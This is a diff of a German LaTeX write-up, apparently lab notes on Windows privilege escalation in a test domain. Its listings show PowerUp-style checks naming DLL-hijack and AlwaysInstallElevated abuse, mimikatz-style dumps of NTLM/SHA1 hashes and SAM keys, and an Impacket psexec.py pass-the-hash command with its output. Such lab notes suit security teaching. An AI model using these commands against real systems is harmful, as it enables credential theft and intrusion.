@@ -93,26 +93,26 @@ Zu diesem Zeitpunkt hat man oft noch keine lokalen Admin-Rechte und versucht nun
     \begin{itemize}
         \item execution policy überspringen
     \end{itemize}
-    \item Import\-Module .\\Privesc.psd1
-    \begin{itemize}
-        \item wichtiges Privsec Module importieren
-    \end{itemize}
+    \item Import\-Module .\textbackslash Privesc.psd1
     \item Invoke-AllChecks
     \begin{itemize}
         \item Privilege Escalation laufen lassen
-        \item Output:
     \end{itemize}
 \end{itemize}
 
 
 \begin{lstlisting}[language=bash]
-    ModifiablePath    : C:\Users\tmassie\AppData\Local\Microsoft\WindowsApps
+    ModifiablePath    : C:\Users\tmassie\AppData\Local\
+            Microsoft\WindowsApps
     IdentityReference : winattacklab\tmassie
     Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
-    %PATH%            : C:\Users\tmassie\AppData\Local\Microsoft\WindowsApps
-    Name              : C:\Users\tmassie\AppData\Local\Microsoft\WindowsApps
+    %PATH%            : C:\Users\tmassie\AppData\Local\
+             Microsoft\WindowsApps
+    Name              : C:\Users\tmassie\AppData\Local\
+            Microsoft\WindowsApps
     Check             : %PATH% .dll Hijacks
-    AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\tmassie\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'
+    AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\tmassie\AppData\Local\
+        Microsoft\WindowsApps\wlbsctrl.dll'
 
     Check         : AlwaysInstallElevated Registry Key
     AbuseFunction : Write-UserAddMSI
@@ -179,13 +179,15 @@ Wenn Sie über lokale administrative Rechte auf einem Windows-Rechner verfügen,
     Domain            : Client1
     Logon Server      : Client1
     Logon Time        : 11/12/2021 4:46:23 PM
-    SID               : S-1-5-21-1681067654-3552921923-1543340101-1005
+    SID               : S-1-5-21-1681067654-3552921923-
+    1543340101-1005
         msv :
          [00000003] Primary
          * Username : backdoor
          * Domain   : Client1
          * NTLM     : a9fdfa038c4b75ebc76dc855dd74f0da
-         * SHA1     : 9400ae28448e1364174dde269b2cce1bca9d7ee8
+         * SHA1     : 9400ae28448e1364174dde269b2cc
+         e1bca9d7ee8
     [CUT]
 \end{lstlisting}
 
@@ -202,7 +204,8 @@ Wenn Sie über lokale administrative Rechte auf einem Windows-Rechner verfügen,
 \begin{lstlisting}[language=bash]
     Domain : Client1
     SysKey : 2d102d4d76b467c3aa870e40d01a3f55
-    Local SID : S-1-5-21-1681067654-3552921923-1543340101
+    Local SID : S-1-5-21-1681067654-3552921923-
+    1543340101
 
     SAMKey : d777e5a8096311cf0c6dd57edebad324
 
@@ -225,11 +228,11 @@ $\rightarrow$ Python Script für pass the hash attacken: \lstinline|psexec.py|\\
 
 \begin{enumerate}
     \item psexec.py - python zum NTLM Hash probieren
-    \item \textbf{psexec.py  -hashes :9859340265d3b3c1eb628ece70ebc238 winattacklab.local/aalfort@10.0.1.101}\\
+    \item psexec.py  -hashes :9859340265d3b3c1eb628ece70ebc238 winattacklab.local/aalfort@10.0.1.101\\
 \end{enumerate}
 
 \begin{lstlisting}[language=PowerShell]
-    Impacket v0.9.22.dev1+20200819.170651.b5fa089b - Copyright 2020 SecureAuth Corporation
+    Impacket v0.9.22.dev1+20200819.170651.b5fa089b
 
     [*] Requesting shares on 10.0.1.101.....
     [*] Found writable share ADMIN$
@@ -250,12 +253,11 @@ $\rightarrow$ Python Script für pass the hash attacken: \lstinline|psexec.py|\\
 
 \begin{enumerate}
     \item psexec.py - python zum NTLM Hash probieren
-    \item \textbf{psexec.py  -hashes :9859340265d3b3c1eb628ece70ebc238 winattacklab.local/aalfort@10.0.1.101}
+    \item psexec.py  -hashes :9859340265d3b3c1eb628ece70ebc238 winattacklab.local/aalfort@10.0.1.101
 \end{enumerate}
 
 \begin{lstlisting}[language=PowerShell]
-    Impacket v0.9.22.dev1+20200819.170651.b5fa089b - Copyright 2020 SecureAuth Corporation
-
+    Impacket v0.9.22.dev1+20200819.170651.b5fa089b
     [*] Requesting shares on 10.0.1.101.....
     [*] Found writable share ADMIN$
     [*] Uploading file LZzQLrwi.exe
@@ -287,17 +289,17 @@ Dieses Tool soll Sicherheitsberatern dabei helfen, potenzielle Schwachstellen au
 Dies zeigt an, dass eine Datei für die unbeaufsichtigte Installation gefunden wurde, die oft Anmeldeinformationen enthält. Wenn Sie in der Ausgabe ein wenig nach oben scrollen, sollten Sie die Details zu diesem Fund finden:
 
 \begin{lstlisting}[language=bash]
-    +------+------------------------------------------------+------+
+    +------+-----------------------------+------+
 
-    | TEST | CREDS > Unattend Files                         | VULN |
+    | TEST | CREDS > Unattend Files     | VULN |
 
-    +------+------------------------------------------------+------+
+    +------+-----------------------------+------+
 
-    | DESC | Locate 'Unattend' files and check whether they        |
+    | DESC | Locate 'Unattend' files and check whether they   |
 
-    |      | contain any clear-text credentials.                   |
+    |      | contain any clear-text credentials.      |
 
-    +------+-------------------------------------------------------+
+    +------+---------------------------------------+
 
     [*] Found 1 result(s).
     Type     : LocalAccount
